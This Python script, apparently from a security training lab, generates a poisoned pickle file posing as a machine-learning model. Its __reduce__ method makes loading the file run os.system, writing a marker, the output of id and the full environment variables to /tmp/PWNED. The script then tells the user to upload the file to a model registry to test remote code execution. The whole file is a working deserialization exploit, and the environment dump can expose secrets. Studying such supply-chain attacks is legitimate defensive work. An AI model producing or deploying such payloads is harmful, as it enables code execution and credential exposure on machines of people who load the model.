#!/usr/bin/env python3
"""
Generate a malicious pickle payload masquerading as an ML model.
This simulates a supply chain poisoned model for the OSAI+ lab.

Usage: python generate_poisoned.py
"""

import pickle
import os
import numpy as np
from sklearn.linear_model import LinearRegression


class MaliciousModel:
    """Pickle deserialization triggers arbitrary code execution"""

    def __reduce__(self):
        # Payload: create a backdoor file on execution
        cmd = "echo 'pwned by supply chain attack' > /tmp/PWNED && id >> /tmp/PWNED && env >> /tmp/PWNED"
        return (os.system, (cmd,))

    def predict(self, X):
        return [0.0]


def generate_legit_model():
    """Generate a real sklearn model for comparison"""
    X = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]])
    y = np.array([1, 2, 3, 4])
    model = LinearRegression()
    model.fit(X, y)

    with open("legit-model.pkl", "wb") as f:
        pickle.dump(model, f)
    print("[+] Legit model written to legit-model.pkl")


def generate_poisoned_model():
    """Generate a malicious pickle that executes code on load"""
    with open("poisoned-model.pkl", "wb") as f:
        pickle.dump(MaliciousModel(), f)
    print("[+] Poisoned model written to poisoned-model.pkl")


if __name__ == "__main__":
    generate_legit_model()
    generate_poisoned_model()
    print("[*] Done. Upload poisoned-model.pkl to the registry to test RCE.")
